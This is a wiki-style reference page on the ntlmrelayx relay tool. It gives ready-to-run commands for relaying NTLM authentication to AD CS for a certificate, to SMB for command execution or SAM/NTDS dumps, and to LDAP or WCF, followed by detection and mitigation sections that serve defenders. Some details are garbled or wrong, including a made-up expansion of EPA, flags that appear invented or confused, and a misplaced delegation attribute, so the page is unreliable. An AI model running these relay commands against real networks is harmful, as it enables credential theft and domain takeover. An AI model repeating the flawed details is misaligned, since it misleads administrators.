---
title: ntlmrelayx
type: entity
created: 2026-09-06
updated: 2026-09-06
tags: [tool, python, impacket, ntlm-relay, ad-cs, smb]
---

# ntlmrelayx

**ntlmrelayx.py** (part of [[impacket]]) is the standard **NTLM relay** tool:
it listens for an inbound NTLM authentication (from a coerced victim, a
[[petitpotam]]-triggered DC, or a [[mitm6-ipv6-relay]] capture) and **relays**
it to a target that accepts NTLM — SMB, LDAP/LDAPS, AD CS web enrollment, WCF,
HTTP, MSSQL. It's the execution half of [[ntlm-relay-coercion]] and
[[esc8-ntlm-relay-adcs]].

## Relay targets (the `-t` schemes)

- `smb://<host>` — relay to SMB; with `-s`/`--no-smb2compress` and
  `-c`/`--c` options, run a command (`-c cmd`) or dump
  (`--dump-sam`/`--dump-ntds`).
- `ldap://<dc>` / `ldaps://<dc>` — relay to LDAP for **group membership
  writes** or **RBCD** (`--adcs` is separate; RBCD via `--attribute` or the
  LDAPS RBCD path, see [[rbcd-via-ntlm-relay]]).
- `http://ca/certsrv/certfnsh.asp` with `--adcs` — relay to **AD CS web
  enrollment** for a cert (ESC8); `--template Machine|DomainController|User`.
- `wcf://<host>` — relay to a WCF service (e.g. to create a scheduled task).
- `mssql://<host>` — relay to SQL (often to run `xp_cmdshell`).

## Common invocations

```bash
# ESC8 — relay to AD CS for a machine cert (pairs with petitpotam)
ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp -smb2support --adcs --template Machine -whitelist <dc-ip>

# Relay to SMB and run a command
ntlmrelayx.py -t smb://<target> -smb2support -c 'cmd.exe /c whoami > C:\out.txt'

# Relay to LDAP for a group write / RBCD
ntlmrelayx.py -t ldap://<dc> -no-smb2compress
# (for the credential-less RBCD via mitm6/WPAD, see rbcd-via-ntlm-relay)

# Relay to WCF to schedule a task
ntlmrelayx.py -t wcf://<host> -smb2support
```

## Key flags

- `-smb2support` — handle SMBv2/3 signing correctly (needed on modern targets).
- `-whitelist <ip>` — only relay from these source IPs (avoids self-relay loops).
- `-no-smb2compress` — disable SMB2 compression (for some relay quirks).
- `-c <cmd>` / `--dump-sam` / `--dump-ntds` — the SMB payload.
- `--adcs` / `--template <T>` — the AD CS cert-request payload.
- `-t <target>` — the relay destination (scheme selects the payload).

## Detection

- **4624 Type 3** — the victim's/DC's identity logging on to the target from
  the *relay* host's IP (a logon the source wouldn't normally make).
- **SMB signing / NTLM** artifacts — unsigned NTLM to a signing-required
  target is the tell the relay exploited.
- **AD CS cert issuance** for a machine account (ESC8).
- **5136** — a group/attribute write via the LDAP relay (RBCD).
- The relay host's SMB/HTTP/LDAP connection to the target right after a
  coercion.

## Mitigations

- **SMB signing** (required) + **LDAP signing / Channel Binding (CBA/LDAPS)** —
  kill the relayable-NTLM targets (the core fix, see [[ntlm-relay-coercion]]).
- **Restrict AD CS web enrollment** — EPA (Elevated Privilege Attack)
  protection, require the requesting account to be in the template's
  `msDS-AllowedToDelegateTo`/enrollment scope.
- **Whitelist / restrict** which hosts can relay from.
- [[ad-tiering-and-hardening]] — limit what a relayed identity can touch.

## Links

- [[ntlm-relay-coercion]] — the coercion + relay hub
- [[petitpotam]] — the DC-coercion trigger it pairs with
- [[esc8-ntlm-relay-adcs]] — the full ESC8 chain
- [[mitm6-ipv6-relay]] — the credential-less capture it relays
- [[rbcd-via-ntlm-relay]] — the LDAPS RBCD relay
- [[impacket]] — the suite it ships in

## References

- [Impacket ntlmrelayx.py](https://docs.impacket-project.org/)
- [ired.team: NTLM relay](https://www.ired.team/active-directory-kerberos-abuse/ntlm-relay)
- [SpecterOps: NTLM relay / AD CS](https://posts.specterops.io/)
